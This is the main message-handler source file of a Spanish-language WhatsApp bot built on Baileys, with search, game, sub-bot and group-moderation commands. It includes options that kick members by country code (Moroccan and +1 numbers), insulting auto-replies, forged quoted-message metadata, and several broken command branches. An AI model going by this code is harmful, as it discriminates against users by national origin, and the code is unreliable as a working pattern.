// Código desde cero y comentarios hecho por: 
// @gata_dios
// @Skidy89
// @elrebelde21 

//═════════[ Importaciones ]═════════ 
const baileys = require('@whiskeysockets/baileys'); // trabajar a través de descargas por Whatsapp 
const moment = require('moment-timezone') // Trabajar con fechas y horas en diferentes zonas horarias
const gradient = require('gradient-string') // Aplicar gradientes de color al texto
const { execSync } = require('child_process') // Función 'execSync' del módulo 'child_process' para ejecutar comandos en el sistema operativo
const chalk = require('chalk') // Estilizar el texto en la consola
const os = require('os') // Proporciona información del sistema operativo
const fs = require('fs') // Trabajar con el sistema de archivos
const fetch = require('node-fetch')
const axios = require('axios')
const cheerio = require('cheerio')
const gpt = require('api-dylux')
const util = require('util')
const mimetype = require("mime-types")
const webp = require("node-webpmux")
const Jimp = require('jimp')
const scp1 = require('./libs/scraper') 
const { facebook } = require('./libs/facebook')
const { instagram } = require('./libs/instagram')
const {jadibot, listJadibot } = require('./serbot.js')  
const speed = require("performance-now")
const ffmpeg = require("fluent-ffmpeg")

const color = (text, color) => { // Función 'color' que toma un texto y un color como parámetros
return !color ? chalk.cyanBright(text) : color.startsWith('#') ? chalk.hex(color)(text) : chalk.keyword(color)(text)} // Si no hay color, utilizar el color celeste brillante (por defecto)

//═══[ Importa varias funciones y objetos ]═════ 
const { smsg, getGroupAdmins, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom } = require('./libs/fuctions')
const { default: makeWASocket, proto } = require("@whiskeysockets/baileys") // Importa los objetos 'makeWASocket' y 'proto' desde el módulo '@whiskeysockets/baileys'
//const { msgFilter } = require('./libs/antispam')
const { ytmp4, ytmp3, ytplay, ytplayvid } = require('./libs/youtube')
const { menu } = require('./plugins/menu.js')
const { state } = require('./plugins/info.js')

const msgs = (message) => { // Función 'msgs' que toma un parámetro 'message'
if (message.length >= 10) { // Longitud de 'message' es mayor o igual a 10 caracteres
return `${message.substr(0, 500)}` // Devuelve los primeros 500 caracteres de 'message'
} else { // Caso contrario
return `${message}`}} // Devuelve 'message' completo

const addCmd = (cmd, id) =>  {
const stickerdb = global.db.data.sticker //gracias a aiden
stickerdb[id] = {id: id,
cmd: cmd
}}
const getCmd = (id) => {
const stickerdb = global.db.data.sticker
let anu = null;  
Object.keys(stickerdb).forEach(nganu => { 
if (stickerdb[nganu].id === id) { 
anu = nganu  
}})  
if (anu !== null) {  
return stickerdb[anu].cmd  
}}
const getFileBuffer = async (mediakey, MediaType) => {
const stream = await downloadContentFromMessage(mediakey, MediaType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk]) }
return buffer}

let blockList = []
/**
* @param {proto.IWebMessageInfo.message} mek
* @param {proto.IWebMessageInfo} chatUpdate
* @param {import("@whiskeysockets/baileys").WASocket} 
*/
module.exports = conn = async (conn, m, chatUpdate, mek) => { // Raíz "conn" para mensajes y argumentos
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage' && m.message.imageMessage.caption) ? m.message.imageMessage.caption : (m.mtype == 'videoMessage' && m.message.videoMessage.caption ) ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? m.message.listResponseMessage.singleSelectReply.selectedRowId :  (m.mtype == 'stickerMessage') && (getCmd(m.message.stickerMessage.fileSha256.toString()) !== null && getCmd(m.message.stickerMessage.fileSha256.toString()) !== undefined) ? getCmd(m.message.stickerMessage.fileSha256.toString()) : ''
	
// ‿︵‿︵ʚɞ『 ATRIBUTOS 』ʚɞ‿︵‿︵
if (m.key.id.startsWith("BAE5")) return  
  var budy = (typeof m.text == 'string' ? m.text : '') // Asignar a la variable budy el valor m.text si es cadena	
//var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=/|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=/|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
  var _prefix = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : ""
global.prefix = _prefix // Almacenar el prefijo predeterminado
const isCmd = body.startsWith(prefix) // Verificar si el contenido de body comienza con el valor almacenado en prefix.
const from = m.chat // Remitente del mensaje
const msg = JSON.parse(JSON.stringify(mek, undefined, 2)) // Mensaje convertido a formato JSON
const content = JSON.stringify(m.message) // Contenido del mensaje convertido a formato JSON
const type = m.mtype // Tipo de mensaje
const arg = body.substring(body.indexOf(' ') + 1) // Argumento extraído del cuerpo del mensaje
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() // Comando extraído del cuerpo del mensaje
const args = body.trim().split(/ +/).slice(1) // Obtiene los argumentos del comando
const q = args.join(" ") // Une los argumentos en una sola cadena separada por espacios
let t = m.messageTimestamp // Marca de tiempo de mensaje
const pushname = m.pushName || "Sin nombre" // Obtiene el nombre de visualización del usuario de lo contrario será "Sin nombre"
const botnm = conn.user.id.split(":")[0] + "@s.whatsapp.net"
const userSender = m.key.fromMe ? botnm : m.isGroup && m.key.participant.includes(":") ? m.key.participant.split(":")[0] + "@s.whatsapp.net" : m.key.remoteJid.includes(":") ? m.key.remoteJid.split(":")[0] + "@s.whatsapp.net" : m.key.fromMe ? botnm : m.isGroup ? m.key.participant : m.key.remoteJid
const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
const isCreator = global.owner.map(([numero]) => numero.replace(/[^\d\s().+:]/g, '').replace(/\s/g, '') + '@s.whatsapp.net').includes(userSender) // Eliminar todo a excepción de números 
const itsMe = m.sender == conn.user.id ? true : false // Verifica si el remitente del mensaje es el propio bot
const text = args.join(" ") // Unir rgumentos en una sola cadena separada por espacios
const quoted = m.quoted ? m.quoted : m // Obtiene el mensaje citado si existe, de lo contrario, se establece como el propio mensaje
const sender = m.key.fromMe ? botnm : m.isGroup ? m.key.participant : m.key.remoteJid // Obtiene el remitente del mensaje según el tipo de chat (individual o grupo)
const mime = (quoted.msg || quoted).mimetype || '' // Tipo de archivo adjunto del mensaje citado o del propio mensaje
const isMedia = /image|video|sticker|audio/.test(mime) // Verifica si el mensaje contiene un archivo multimedia (imagen, video, sticker o audio)
const numBot = conn.user.id.split(":")[0] + "@s.whatsapp.net" // JID del Bot
const numBot2 = conn.user.id // Número de teléfono del bot
const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms))
const mentions = []
if (m.message[type].contextInfo) { 
if (m.message[type].contextInfo.mentionedJid) {
const msd = m.message[type].contextInfo.mentionedJid
for (let i = 0; i < msd.length; i++) {
mentions.push(msd[i])}}}
	
// ‿︵‿︵ʚɞ『 GRUPO 』ʚɞ‿︵‿︵
const groupMetadata = m.isGroup ? await conn.groupMetadata(from) : '' // Obtiene información del grupo
const groupName = m.isGroup ? groupMetadata.subject : '' // Nombre del grupo
const participants = m.isGroup ? await groupMetadata.participants : '' // Lista de participantes del grupo
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : '' // // Lista de administradores del grupo

const isBotAdmins = m.isGroup ? groupAdmins.includes(numBot) : false // Verifica si el bot es un administrador del grupo
const isGroupAdmins = m.isGroup ? groupAdmins.includes(userSender) : false // Verifica si el remitente del mensaje es un administrador del grupo
const isBaneed = m.isGroup ? blockList.includes(userSender) : false // Verifica si el remitente del mensaje está en la lista de bloqueados

// ‿︵‿︵ʚɞ『 TIPOS DE MENSAJES Y CITADOS 』ʚɞ‿︵‿︵
const reply = (text) => {
 m.reply(text)} // Enviar una respuesta 
 const sendAdMessage = (text, edit, title, body, image, url) => { conn.sendMessage(from, {text: text, edit: key, contextInfo: { externalAdReply: { title: title, body: body, mediaUrl: url, sourceUrl: url, previewType: 'PHOTO', showAdAttribution: true, thumbnail: image, sourceUrl: url }}}, {})} 
 const sendImage = ( image, caption ) => { conn.sendMessage(from, { image: image, caption: caption }, { quoted: m })} 
 const sendImageAsUrl = ( url, caption ) => { conn.sendMessage(from, { image:  {url: url }, caption: caption }, { quoted: m })}
const sendSticker = ( image, fkontak) => { conn.sendMessage(m.chat, { sticker: image }, { quoted: fkontak})}

const isAudio = type == 'audioMessage' // Mensaje de Audio
const isSticker = type == 'stickerMessage' // Mensaje de Sticker
const isContact = type == 'contactMessage' // Mensaje de Contacto
const isLocation = type == 'locationMessage' // Mensaje de Localización 
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
const isQuotedMsg = type === 'extendedTextMessage' && content.includes('Message') // Mensaje citado de cualquier tipo
const isViewOnce = (type === 'viewOnceMessage') // Verifica si el tipo de mensaje es (mensaje de vista única)

function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

//base de datos
let user = global.db.data.users[m.sender]
let chats = global.db.data.users[m.chat]
let setting = global.db.data.settings[conn.user.jid]  
let mathGame = global.db.data.game.math = [] 
let ppt = global.db.data.game.ppt = []
let ttt = global.db.data.game.ppt = []
  
//autobio
/*if (global.db.data.settings[numBot].autobio) {
let setting = global.db.data.settings[numBot]
if (new Date() * 1 - setting.status > 1000) {
let uptime = await runtime(process.uptime())
const bio = `ɴᴏᴠᴀʙᴏᴛ-ᴍᴅ | ᴀᴄᴛɪᴠᴏ ✅️: ${runtime(process.uptime())}\n\nᴘᴀʀᴀ ᴠᴇᴢ ᴍɪ ʟɪsᴛᴀ ᴅᴇ ᴄᴏᴍᴀɴᴅᴏ ᴜsᴀʀ #menu`
await conn.updateProfileStatus(bio)
setting.status = new Date() * 1
}} */
  
//autoread
if (m.message) {
conn.readMessages([m.key])}
            
if (global.db.data.chats[m.chat].antifake && !isGroupAdmins) {	
if (m.chat && m.sender.startsWith('1')) return conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
if (global.db.data.chats[m.chat].antiarabe && !isGroupAdmins) {
if (m.chat && m.sender.startsWith('212')) return conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
	
//antilink
if (global.db.data.chats[m.chat].antilink) {
if (budy.match(`chat.whatsapp.com`)) {
let delet = m.key.participant
let bang = m.key.id
kice = m.sender
reply(`\`\`\`「 ANTILINK DETECTADO 」\`\`\`\n\n*@${kice.split("@")[0]} sera expulsado del grupo sucia rata 🙄*`)
if (!isBotAdmins) return reply(`El bot necesita admin para eliminar al incluso 🙄`)
let gclink = (`https://chat.whatsapp.com/`+await conn.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return reply(`Te salvarte el link enviado es de este grupo`)
if (isGroupAdmins) return reply(`Te salvarte perra eres admin jjj`)
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')}}

//modo public & privado
if (!conn.public && !isCreator) {
if (!m.key.fromMe) return
}        	
//Banea chat
if (global.db.data.chats[m.chat].ban && !isCreator) {
return
}
//modoadmin
if (global.db.data.chats[m.chat].modeadmin && !isGroupAdmins) {
return
}

// Tiempo de Actividad del bot
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
//conn.sendReadReceipt(from,sender,[m.key.id])
        
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}})

const thumb = fs.readFileSync("./media/test.jpg")
let fkontak = { "key": { "participants":"0@s.whatsapp.net", "remoteJid": "status@broadcast", "fromMe": false, "id": "Halo" }, "message": { "contactMessage": { "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${userSender.split('@')[0]}:${userSender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD` }}, "participant": "0@s.whatsapp.net" }
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: "ɴᴏᴠᴀʙᴏᴛ-ᴍᴅ", orderTitle: "sᴜᴘᴇʀ ʙᴏᴛ ᴅᴇ ᴡʜᴀᴛsᴀᴘᴘ", sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const fdoc = {key : {participant : '0@s.whatsapp.net', ...(from ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: "A", jpegThumbnail: null}}}
const kick = function (from, orangnya) {
for (let i of orangnya) {
conn.groupParticipantsUpdate(from, [i], "remove");
}}
const time = moment(Number(msg.messageTimestamp + "000")).locale("es-mx").tz("America/Bogota").format('MMMM Do YYYY, h:mm:ss a')

// ‿︵‿︵ʚɞ『 INFO CONSOLE 』ʚɞ‿︵‿︵	
if (m.message) {
console.log(chalk.bold.cyanBright(`▣────────────···\n│${botname} ${conn.user.id == global.numBot2 ? '' : '(jadibot)'}`), 
chalk.bold.magenta('\n│⏰HORARIO: ') + chalk.magentaBright(moment(t * 1000).tz(place).format('DD/MM/YY HH:mm:ss'),
chalk.bold.yellow('\n│📑TIPO (SMS): ') + chalk.yellowBright(`${type}`), 
chalk.bold.cyan('\n│📊USUARIO: ') + chalk.cyanBright(pushname) + ' ➜', gradient.rainbow(userSender), 
m.isGroup ? chalk.bold.greenBright('\n│📤GRUPO: ') + chalk.greenBright(groupName) + ' ➜ ' + gradient.rainbow(from) : chalk.bold.greenBright('\n│📥PRIVADO'), 
//chalk.bold.red('\nETIQUETA: ') + chalk.redBright(`[${isBaneed ? 'Banned' : ''}]`),
chalk.bold.white('\n│💬MENSAJE: ') + chalk.whiteBright(`\n▣────────────···\n${msgs(m.text)}\n`))
)}

//Suit PvP 
this.suit = this.suit ? this.suit : {}; 
let roof = Object.values(this.suit).find( 
(roof) => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender) 
); 
if (roof) { 
let win = ""; 
let tie = false; 
  
if ( 
m.sender == roof.p2 && 
body == "aceptar" && 
m.isGroup && 
roof.status == "wait" 
) { 
if (/^(tolak|negar|nanti|n|ga(k.)?bisa|no|Rechazar)/i.test(m.text)) { 
conn.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} Rechazo el juego\nppt cancelado`, m); 
delete this.suit[roof.id]; 
return !0; 
} 
roof.status = "play"; 
roof.asal = m.chat; 
clearTimeout(roof.waktu); 
//delete roof[roof.id].waktu 
conn.sendText(m.chat, `*Jugador 1:* @${roof.p.split`@`[0]}\n*jugador 2:* @${roof.p2.split`@`[0]}\n\nPor favor revisa tu privado el este número`, m, { mentions: [roof.p, roof.p2] }); 
if (!roof.pilih) 
conn.sendText(roof.p, `*Escribe:*\n\nPiedra 🗿\nPapel 📄\nTijera ✂️`); 
if (!roof.pilih2) 
conn.sendText(roof.p2, `*Escribe:*\n\nPiedra 🗿\nPapel 📄\nTijera ✂️`, m); 
roof.waktu_milih = setTimeout(() => { 
if (!roof.pilih && !roof.pilih2) 
conn.sendText(m.chat, `Ambos jugadores no tenian intencion de jugar,\nPPT cancelado`); 
else if (!roof.pilih || !roof.pilih2) { 
win = !roof.pilih ? roof.p2 : roof.p; 
conn.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} No escogio, Game Over`, m); 
} 
delete this.suit[roof.id]; 
return !0; 
}, roof.timeout); 
} 
let jwb = m.sender == roof.p; 
let jwb2 = m.sender == roof.p2; 
let g = /tijera/i; 
let b = /piedra/i; 
let k = /papel/i; 
let reg = /^(tesoura|pedra|papel)/i; 
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) { 
roof.pilih = reg.exec(m.text.toLowerCase())[0]; 
roof.text = m.text; 
conn.sendText(`Eligiste ${m.text} ${!roof.pilih2 ? `\n\nEsperando a tu oponente...` : "" }`); 
if (!roof.pilih2) 
conn.sendText(roof.p2, "_Ya tu oponente eligio_\nTe toca eligir", 0 )} 
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) { 
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]; 
roof.text2 = m.text; 
conn.sendText(`Escogiste ${m.text} ${!roof.pilih ? `\n\nEsperando al oponente...` : ""}`); 
if (!roof.pilih) 
conn.sendText(roof.p, "_Ya tu oponente eligió_\nte toca eligir", 0 ); 
} 
let stage = roof.pilih; 
let stage2 = roof.pilih2; 
if (roof.pilih && roof.pilih2) { 
clearTimeout(roof.waktu_milih); 
if (b.test(stage) && g.test(stage2)) win = roof.p; 
else if (b.test(stage) && k.test(stage2)) win = roof.p2; 
else if (g.test(stage) && k.test(stage2)) win = roof.p; 
else if (g.test(stage) && b.test(stage2)) win = roof.p2; 
else if (k.test(stage) && b.test(stage2)) win = roof.p; 
else if (k.test(stage) && g.test(stage2)) win = roof.p2; 
else if (stage == stage2) tie = true; 
conn.sendText(roof.asal, `_*Resultado de PvP:*_${tie ? "\n" : ""}\n\n@${roof.p.split`@`[0]} elegio ${roof.text}! ${tie ? "" : roof.p == win ? ` Gano\n` : `\n`}\n@${roof.p2.split`@`[0]} & ${roof.text2}! ${tie ? "" : roof.p2 == win ? ` Gano🏆\n` : `\n`}`.trim(), m, { mentions: [roof.p, roof.p2] }); 
delete this.suit[roof.id]; 
}} 
  
if (mathGame.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
  test = true
  mathInGame = mathGame[m.sender.split('@')[0]]
  if (budy.toLowerCase() == mathInGame) {
    let exp = Math.floor(Math.random() * 1000)
  await sendAdReply(m.chat, `*「 Juegos 」*\n*respuesta correcta 🎉*\n*Ganaste ${exp} de experiencia 🥳*`, sucess, m, false)
  global.db.data.chats[m.sender.split('@')[0]] += exp
  delete mathGame[m.sender.split('@')[0]]
  } else { 
  m.reply(`Respuesta incorrecta`)}
  }

//Marcar como (Escribiendo...) 
/*if (command) {
await conn.sendPresenceUpdate('composing', m.chat)
}*///Para que le guste :v
     
//ARRANCA LA DIVERSIÓN
switch (command) {
case 'yts':
if (!text) return reply(`*Ejemplo:*\n${prefix + command} anime`)
const yts = require("youtube-yts");
const search = await yts(text);
const {key} = await conn.sendMessage(from, {text: info.wait}, { quoted: fkontak })
await conn.sendMessage(from, {text: info.waitt, edit: key}, { quoted: fkontak })
await conn.sendMessage(from, {text: info.waittt, edit: key}, { quoted: fkontak })
await conn.sendMessage(from, {text: info.waitttt, edit: key}, { quoted: fkontak })	
let teks = '💫 Resultados de ' + text + '\n\n';
let no = 1;
let themeemoji = "🔶"
for (let i of search.all) {
  teks += `${themeemoji} OPCIÓN : ${no++}\n${themeemoji} TIPO: ${i.type}\n${themeemoji} ID DEL VIDEO : ${i.videoId}\n${themeemoji} TITULO: ${i.title}\n${themeemoji} VISTAS : ${i.views}\n${themeemoji} DURACIÓN : ${i.timestamp}\n${themeemoji} SUBIDOS: ${i.ago}\n${themeemoji} URL: ${i.url}\n\n✧⋄⋆⋅⋆⋄✧⋄⋆⋅⋆⋄✧⋄⋆⋅⋆⋄✧⋄⋆⋅⋆⋄✧\n\n`;
}
await conn.sendMessage(from, { image: { url: search.all[0].thumbnail }, caption: teks }, { quoted: fkontak });
await conn.sendMessage(from, {text: info.result, edit: key}, { quoted: fkontak })
break
             
case 'serbot': case 'jadibot':
if (m.isGroup) return m.reply(info.private) 
await jadibot(conn, m, from, command, prefix)  
break  
  
case 'bots': case 'listbots':
try { 
let user = [... new Set([...global.listJadibot.filter(conn => conn.user).map(conn => conn.user)])] 
te = "*Lista de subbots*\n\n" 
for (let i of user){ 
y = await conn.decodeJid(i.id) 
te += " ❑ Usuario : @" + y.split("@")[0] + "\n" 
te += " ❑ Nombre : " + i.name + "\n\n" 
} 
conn.sendMessage(from ,{text: te, mentions: [y], },{quoted: m}) 
} catch (err) { 
reply(`*No hay subbots activo el este momento intente mas tardes*`) 
} 
break 

case 'acortar':
 if (!text) return m.reply(`*Ingresa un link para acortar!*`)
let shortUrl1 = await (await fetch(`https://tinyurl.com/api-create.php?url=${args[0]}`)).text()  
if (!shortUrl1) return m.reply(`*⚠️ ERROR*`)
let done = `*❇️ LINK ACORTADO*\n\n*➵ link: ${text}*\n➵ *Link Acortado: ${shortUrl1}*`
m.reply(done)
break

case 'google': {      
if (!text) return reply(`*Ejemplo:*\n${prefix + command} gatito`)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `💫 𝘙𝘌𝘚𝘜𝘓𝘛𝘈𝘋𝘖𝘚 𝘋𝘌 : ${text}\n\n`
for (let g of res) {
teks += `🔶 *Titulo* : ${g.title}\n`
teks += `🔶 *Descripcion* : ${g.snippet}\n`
teks += `🔶 *Link* : ${g.link}\n\n✧⋄⋆⋅⋆⋄✧⋄⋆⋅⋆⋄✧⋄⋆⋅⋆⋄✧⋄⋆⋅⋆⋄✧\n\n`
} 
reply(teks)
})
}
break 

case 'imagen': {
if (!text) return reply(`*Que esta buscado?*\n*Ejemplo:*\n${prefix + command} gatito`)
image = await fetchJson(`https://api.akuari.my.id/search/googleimage?query=${text}`)
n = image.result
images = n[Math.floor(Math.random() * n.length)]
conn.sendMessage(m.chat, { image: { url: images}, caption: `*💫 𝘙𝘌𝘚𝘜𝘓𝘛𝘈𝘋𝘖𝘚 𝘋𝘌 :* ${text}`}, { quoted: m })}
break
 
case 'ppt':  
if (!m.isGroup) return reply(info.group);  
this.suit = this.suit ? this.suit : {};  
let poin = 10;  
let poin_lose = 10;  
let timeout = 60000;  
if (Object.values(this.suit).find((roof) => roof.id.startsWith("ppt") && [roof.p, roof.p2].includes(m.sender))) {  
return reply("primero completa o espera a que termine el juego anterior");  
}  
if (m.mentionedJid[0] === m.sender) {  
return reply("No puedo jugar contigo Pelotudo");  
}  
if (!m.mentionedJid[0]) {  
return reply("*Con quien quiere jugar?*\n*bolu etiqueta a la persona no soy adivino*");  
}  
if (Object.values(this.suit).find((roof) => roof.id.startsWith("suit") && [roof.p, roof.p2].includes(m.mentionedJid[0]))) {  
return reply("_Esa persona esta jugando con otra :(_");  
}  
let id = "ppt_" + new Date() * 1;  
let caption = `*Jugador 1:* @${m.sender.split`@`[0]}\nJugador 2:* @${m.mentionedJid[0].split`@`[0]}\n\n*Escribe :* _aceptar_ para acerta\nEscribe _rechazar_ para cancelar`;  
this.suit[id] = {  
chat: await m.reply(caption),  
id: id,  
p: m.sender,  
p2: m.mentionedJid[0],  
status: "wait",  
waktu: setTimeout(() => {  
if (this.suit[id]) {  
conn.sendText(m.chat, `*_se agoto el tiempo_*\n*al parecer @${roof.p2.split`@`[0]} ni siquiera se digno a responder*`, m);  
delete this.suit[id];  
}}, 60000),  
poin,  
poin_lose,  
timeout,  
};  
break

case 'math': 
    if (mathGame.hasOwnProperty(m.sender.split('@')[0])) return m.reply(`hay un juego ahora mismo\n espera a que ese juego termine`)
    let { genMath, modes } = require('./libs/math')
    if (!text) return m.reply(`*elige uno de estos modos*\n*${Object.keys(modes.join(' | '))}\n*Ejemplo de uso*\n*${prefix + command} medium*`)
    let resulta = await genMath(text.toLowerCase())
    conn.sendText(m.chat, `*¿Cuál es el resultado de ${result.question.toLowerCase()}?\n*Tiempo: ${(result.time / 1000).toFixed(2)}`)
    await sleep(resulta.time)
    if (mathGame.hasOwnProperty(m.sender.split('@')[0])) {
    m.reply("*tu tiempo se acabo*\n*la respuesta era*" + mathGame[m.sender.split('@')[0]])
     delete mathGame[m.sender.split('@')[0]]}
    break
                                    		
case 'attp':
if (!text) return reply('ingresa algo para convertirlo a sticker :v')
link = `https://api.lolhuman.xyz/api/attp?apikey=${lolkeysapi}&text=${text}`
conn.sendMessage(m.chat, { sticker: { url: link } }, { quoted: fkontak})
break

//info
case 'estado':
await state(conn, m, speed, sender, fkontak) 
break

case 'menu': 
conn.sendMessage(from, { text: menu(conn, prefix, pushname, sender, m),  
contextInfo:{  
forwardingScore: 9999999,  
isForwarded: true,   
mentionedJid:[sender],  
"externalAdReply": {  
"showAdAttribution": true,  
"renderLargerThumbnail": true,  
"title": wm,   
"containsAutoReply": true,  
"mediaType": 1,   
"thumbnail": imagen3,  
"mediaUrl": md, 
"sourceUrl": md, 
}}}, { quoted: fkontak }) 
break 

case 'owner': case 'creador':
let vcard = `BEGIN:VCARD\nVERSION:3.0\nN:;OWNER 👑;;;\nFN:OWNER\nORG:OWNER 👑\nTITLE:\nitem1.TEL;waid=595975740803:+595 975 740803\nitem1.X-ABLabel:OWNER 👑\nX-WA-BIZ-DESCRIPTION:ᴇsᴄʀɪʙɪ sᴏʟᴏ ᴘᴏʀ ᴄᴏsᴀs ᴅᴇʟ ʙᴏᴛ.\nX-WA-BIZ-NAME:Owner 👑\nEND:VCARD`
let a = await conn.sendMessage(from, { contacts: { displayName: 'ɴᴏᴠᴀʙᴏᴛ-ᴍᴅ 👑', contacts: [{ vcard }] }}, {quoted: m})
conn.sendMessage(from, { text : `Hola @${sender.split("@")[0]}, este bot esta desarrollo si quiere contacta con mi creador aqui te dejo sus número`, mentions: [sender]}, { quoted: a })
break 

case 'grupos': case 'grupoficiales': 
conn.sendMessage(from, { text: `*BOT EL DESARROLLO*\n\n*Te puede unirte al grupo para proba el bot y sus funciones 😼*\n\n${nnn}` }, { quoted: msg })
break

case 'instalarbot': case 'crearbot': 
conn.sendMessage(m.chat, { text: `┎┈┈┈┈┈┈┈┈┈┈┈┈┈┈
\`\`\`COMO INSTALAR ESTE BOT?\`\`\`
\`\`\`Este bot es nuevo todavía no se puede instalar si quiere probar sus funciones entra al grupo del bot\`\`\`
*Escribe: ${prefix}grupos*

\`\`\`o puede probar las funcion de hacerte un sub bot Escribe: ${prefix}serbot\`\`\`
┖┈┈┈┈┈┈┈┈┈┈┈┈┈┈`,
contextInfo:{
mentions: [sender], 
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${wm}`,
"body": `${pushname}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": imagen1, 
"sourceUrl": md}}},
{ quoted: m})
break

case '5492266613038': case '593980586516': case '595975740803': {
if (!args.join(" ")) return reply(`┗❴ ⚠ 𝐀𝐃𝐕𝐄𝐑𝐓𝐄𝐍𝐂𝐈𝐀 ⚠ ❵┛\n
ᴇsᴛᴀ ᴘʀᴏʜɪʙɪᴅᴏ ᴇᴛɪᴏ̨ᴜᴇᴛᴀʀ ᴀʟ ᴄʀᴇᴀᴅᴏʀ sɪ ᴛɪᴇɴᴇs ᴜɴᴀ ᴅᴜʀᴀ ʀᴇғᴇʀᴇɴᴛᴇ ᴀʟ ʙᴏᴛ ᴇsᴄʀɪʙɪʀʟᴇ ᴀ sᴜs ᴘʀɪᴠ.`)
for (let i of owner) {
}}
break

case 'grupo':
if (!m.isGroup) return reply(info.group);  
if (!isBotAdmins) return reply(info.botAdmin)
if (!isGroupAdmins) return reply(info.admin)
if (!text) return reply(`*Accion mal usaba*\n\n*Use de esta forma:*\n*${prefix + command} abrir*\n*${prefix + command} cerrar*`)
if (args[0] === 'abrir') {
if (args[0] === 'open') {
m.reply(`*GRUPO ABIERTO CON EXITO✅*`)
await conn.groupSettingUpdate(from, 'not_announcement')
}} else if (args[0] === 'cerrar') {
if (args[0] === 'close') {
m.reply(`*GRUPO CERRADO CON EXITO✅*`)
await conn.groupSettingUpdate(from, 'announcement')
}}
break

case 'delete': case 'del': {
if (!m.quoted) throw false
if (!isBotAdmins) return reply(info.botAdmin)
if (!isGroupAdmins) return reply(info.admin)
let { chat, fromMe, id} = m.quoted
let delet = m.message.extendedTextMessage.contextInfo.participant
let bang = m.message.extendedTextMessage.contextInfo.stanzaId
return conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})}
break  

case 'public': case 'publico': {
if (!isCreator) return reply(info.owner)
conn.public = true
reply('✅Cambio con exitoso a uso público')}
break
case 'self': case 'privado': {
if (!isCreator) return reply(info.owner)
conn.public = false
reply('✅Cambio con exitoso a uso privado')}
break	

case 'autoadmin': case 'tenerpoder': {
if (!m.isGroup) return reply(info.group)
if (!isCreator) return reply(info.owner)
m.reply('Ya eres admin mi jefe 😎') 
await conn.groupParticipantsUpdate(m.chat, [m.sender], "promote")
}
break 
		
case 'welcome':
case 'audios':
case 'modeadmin':
case 'antifake': case 'antinternacional':
